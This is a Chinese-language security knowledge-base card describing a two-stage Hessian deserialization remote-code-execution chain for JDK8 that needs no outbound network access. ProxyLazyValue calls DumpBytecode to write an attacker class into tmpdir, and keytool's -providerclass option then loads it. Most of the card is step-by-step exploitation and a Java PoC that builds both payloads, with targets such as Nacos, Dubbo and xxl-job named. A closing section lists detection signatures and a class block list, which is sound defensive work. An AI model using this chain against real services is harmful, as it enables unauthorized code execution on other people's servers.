---
id: web-java-deser-hessian-dumpbytecode-keytool-write-class-load-provider
title: Hessian 不出网两阶段链：ProxyLazyValue 调 DumpBytecode 把 class 写入 tmpdir，再用 keytool Main 以 -providerclass 加载执行
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-dumpbytecode-keytool-class-write-load
aliases:
- Hessian 不出网链
- DumpBytecode 写 class
- keytool 加载 provider
- ProxyLazyValue DumpBytecode
- sun.security.tools.keytool.Main
- nashorn 写字节码
- Hessian no-egress RCE
tags:
- java
- hessian
- deserialization
- no-egress
- jdk-only
- dumpbytecode
- keytool
- providerclass
- class-write
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V454
  verified_at: '2026-11-10T02:21:03+08:00'
  notes: 已对照原文核对：图09 SerializerFactory.getDefaultSerializer 的 !Serializable&&!isAllowNonSerializable 抛错、图11 getDefaultDeserializer 选 UnsafeDeserializer、图10 MultiUIDefaults 非 public 被 MapDeserializer readMap newInstance 拒绝、图12/13 UnsafeDeserializer.instantiate 走 _unsafe.allocateInstance、图14-18 0x43(67)→readObjectDefinition→readString→expect→readObject→异常拼接 obj.toString 的触发链、图19-21 PKCS9Attributes.toString→getAttribute→attributes.get 与 EMAIL_ADDRESS_OID、图24 ProxyLazyValue 走上下文类加载器+MethodUtil.invoke、图22/25 SwingLazyValue Class.forName(...,null) 只到 rt.jar、图23 ClassFactory 静态黑名单 Runtime/Process/System/Thread、图26 keytool Main 用 PathList+URLClassLoader loadClass，均与卡一致；DumpBytecode 写 class + keytool -providerclass/-providerpath 两阶段 POC 与原文两个 POC 对应。既有 web-java-deser-hessian-jdk-only-proxylazyvalue-chain 只把 DumpBytecode 列为 sink、未展开 keytool 两阶段实现，grep 确认 knowledge 中无其他 keytool 链，dedup new 成立。未在本机复跑。原文未给受影响版本区间，affected_versions 已 --clear。
---

## 一句话结论

目标不出网、且 Hessian 的 `ClassFactory` 黑名单封禁了 `java.lang.System` 等类时，可以用两阶段本地链完成 RCE：第一个 Hessian 流经 `UIDefaults.ProxyLazyValue` 调用 `jdk.nashorn.internal.codegen.DumpBytecode.dumpBytecode`，把攻击者类字节写到 `java.io.tmpdir`；第二个流调用 `sun.security.tools.keytool.Main.main`，用 `-providerclass <类名> -providerpath <tmpdir>` 让 keytool 构造 `URLClassLoader` 并 `loadClass`，加载刚写入的类触发静态初始化，全程不访问外部网络。

## 原理

- **公共触发骨架**：Hessian 反序列化先由 `PKCS9Attributes.toString`（或 expect 异常拼接）进入 `UIDefaults.get → LazyValue.createValue`；`ProxyLazyValue.createValue` 使用线程上下文/系统类加载器 `Class.forName(className, true, loader)` 并反射调用目标类的 public static 方法或 public 构造器。因此只要目标类在 classpath（含 JDK 扩展 jar）且方法是 public static，就能被调用。
- **为什么用 ProxyLazyValue 而不是 SwingLazyValue**：`SwingLazyValue.createValue` 的 `Class.forName(className, true, null)` 使用 Bootstrap ClassLoader，只能加载 rt.jar/核心模块里的类；`DumpBytecode` 位于 `nashorn.jar`，必须用走线程上下文/系统加载器的 `ProxyLazyValue` 才能加载到。
- **第一阶段（写 class）**：`jdk.nashorn.internal.codegen.DumpBytecode#dumpBytecode` 的第一个参数是 `ScriptEnvironment`，其 `_dest_dir` 决定输出目录；用 `Unsafe.allocateInstance` 绕过构造器创建 `ScriptEnvironment`，反射把 `_dest_dir` 设为 `System.getProperty("java.io.tmpdir")`，同时用 Unsafe 创建 `DebugLogger`，传入要落盘的类字节（示例为 `ToByte.toByte()` 生成的 `RunCommand` 类字节）与类名。`ProxyLazyValue` 的 `acc` 字段置 null（无 SecurityManager 时用于跳过 AccessControlContext 检查），调用后 tmpdir 出现 `RunCommand.class`。
- **第二阶段（加载执行）**：`sun.security.tools.keytool.Main#main` 解析 `-providerclass`/`-providerpath` 参数时，会从 `java.class.path`、`env.class.path` 与 `providerpath` 构造 `PathList/URLClassLoader`，再对每个 provider 执行 `((ClassLoader)cl).loadClass(providerClass)`；加载 `RunCommand` 时其静态初始化块/构造器即执行攻击者代码（示例用 `-genkeypair` 触发 keytool 进入 provider 初始化流程）。
- **为什么能成立**：两个 sink 都是 JDK 自带的 public static 方法，签名固定、无需第三方依赖；类字节不通过网络传输，而是先写本地文件再由本地类加载器加载，因此完全不出网。Hessian 的 `ClassFactory` 黑名单只拦 `java.lang.Runtime/Process/System/Thread` 等类，`DumpBytecode` 与 `keytool.Main` 不在名单内；用 ProxyLazyValue 调用 public static 方法也不经过 `Runtime.exec`。
- **限制**：需要 JDK8（含 nashorn 与 `sun.security.tools.keytool`；高版本 JDK 移除了 nashorn/内部结构变化）；tmpdir 必须可写；两次请求都要成功且顺序正确；`DumpBytecode` 方法签名/私有字段随 JDK 版本变化，需按实际环境适配。

## 触发条件

- 存在 Hessian 反序列化入口（Nacos raft、Dubbo、HessianServlet、xxl-job 等）。
- 目标 JDK8（nashorn.jar、sun.security.tools.keytool.Main 可用），且未把 `UIDefaults`/`ProxyLazyValue`/`PKCS9Attributes` 等列入反序列化黑名单。
- `java.io.tmpdir` 可写，keytool 能从 `-providerpath` 加载类（普通权限即可）。
- 目标不出网也满足（本链不需要外连）。

## 利用步骤

1. 生成要执行的类字节（例如 `RunCommand` 的静态初始化块执行命令），保证是 keytool 能加载的普通 class。
2. 用 `Unsafe.allocateInstance` 创建 `ScriptEnvironment`，反射设置私有字段 `_dest_dir = System.getProperty("java.io.tmpdir")`；用 Unsafe 创建 `DebugLogger`。
3. 构造 `UIDefaults.ProxyLazyValue("jdk.nashorn.internal.codegen.DumpBytecode", "dumpBytecode", new Object[]{scriptEnvironment, debugLogger, classBytes, "RunCommand"})`，反射把 `acc` 置 null；放入 `UIDefaults`，key 用 `PKCS9Attribute.EMAIL_ADDRESS_OID`，外层用 `PKCS9Attributes`（设 `attributes` 字段）承载。
4. Hessian 序列化该对象（`setAllowNonSerializable(true)`），在流前加 `0x43`（`'C'`）触发 expect→toString，发送第一个请求；确认 tmpdir 生成 `RunCommand.class`。
5. 构造第二个 payload：`ProxyLazyValue("sun.security.tools.keytool.Main", "main", new Object[]{new String[]{"-genkeypair","-keypass","123456","-keystore","test","-storepass","123456","-providername","test","-providerclass","RunCommand","-providerpath", tmpdir}})`，同样放入 `UIDefaults`/`PKCS9Attributes` 并加 `0x43` 前缀，发送第二个请求。
6. keytool 构造 URLClassLoader 并加载 `RunCommand`，静态初始化执行命令；用进程/文件/回连确认。
7. 清理 tmpdir 中的 class 与 keytool 生成的 keystore 文件。

## PoC

```java
// 关键构造（省略 Hessian 序列化/PKCS9Attributes 包装；未在本机执行）
ScriptEnvironment env = (ScriptEnvironment) unsafe.allocateInstance(ScriptEnvironment.class);
setField(env, "_dest_dir", System.getProperty("java.io.tmpdir"));

UIDefaults.ProxyLazyValue write = new UIDefaults.ProxyLazyValue(
    "jdk.nashorn.internal.codegen.DumpBytecode", "dumpBytecode",
    new Object[]{env, unsafe.allocateInstance(DebugLogger.class), classBytes, "RunCommand"});
setField(write, "acc", null);

UIDefaults.ProxyLazyValue load = new UIDefaults.ProxyLazyValue(
    "sun.security.tools.keytool.Main", "main",
    new Object[]{new String[]{
        "-genkeypair", "-keypass", "123456", "-keystore", "test",
        "-storepass", "123456", "-providername", "test",
        "-providerclass", "RunCommand",
        "-providerpath", System.getProperty("java.io.tmpdir")}});
setField(load, "acc", null);

// 分别把 write/load 放进 UIDefaults -> PKCS9Attributes.attributes，
// Hessian 序列化并前置 0x43 后分两次发送
```

说明：按文章两个 POC 的结构简化，类字节/字段名随 JDK 版本不同；未在本机执行。

## 变体与关联

- [[web-java-deser-hessian-jdk-only-proxylazyvalue-chain]]：本链的公共触发原语（UIDefaults/ProxyLazyValue 调任意 static 方法）与 sink 总览；本卡是其中“写 class + keytool 加载”的完整不出网两阶段实现。
- [[web-java-deser-hessian-nacos-raft-abstractprocessor-entry]]：本链在 Nacos raft 入口上的投递方式。
- [[web-java-deser-hessian-jndi-outbound-chains]]：出网场景的 JNDI 链，与本卡互补。
- 变体：同类 sink 还有 `com.sun.org.apache.bcel.internal.util.JavaWrapper#_main`（JDK<8u251 BCEL 加载）、`MethodUtil.invoke`、`sun.tools.jar.Main.main`、`jdk.jfr.internal.Utils.writeGeneratedAsm`、`JavaUtils.writeBytesToFilename` 写文件；写 DLL + `System.load` 也可组合，但 `System` 在 ClassFactory 黑名单中，需要其他调用方式。
- 边界：JDK 版本不匹配、tmpdir 不可写、反序列化黑名单包含 `DumpBytecode`/`keytool.Main`/`ProxyLazyValue`、或只能发一次请求时链断。

## 检测与防御

- 检测：Hessian 流中出现 `jdk.nashorn.internal.codegen.DumpBytecode`、`sun.security.tools.keytool.Main`、`javax.swing.UIDefaults$ProxyLazyValue`、`sun.security.pkcs.PKCS9Attributes`；同一来源短时间内先反序列化写 class 再触发 keytool；`java.io.tmpdir` 下出现异常 `.class`/keystore 文件。
- 检测：进程命令行/行为中出现 `keytool` 参数 `-providerclass`/`-providerpath` 指向临时目录（Java 进程内调用 Main 不一定有独立进程，需结合类加载/文件监控）。
- 防御：Hessian 反序列化类允许列表，拒绝 `UIDefaults`/`ProxyLazyValue`/`PKCS9Attributes`/`DumpBytecode`/`keytool.Main`；升级到无 nashorn 的 JDK 并强封装内部 API；限制 tmpdir 执行/类加载；入口鉴权与网络隔离。
- 响应：保留原始 Hessian 流作为证据，检查 tmpdir 与类加载痕迹、确认命令执行与外连，清理落地 class/keystore。
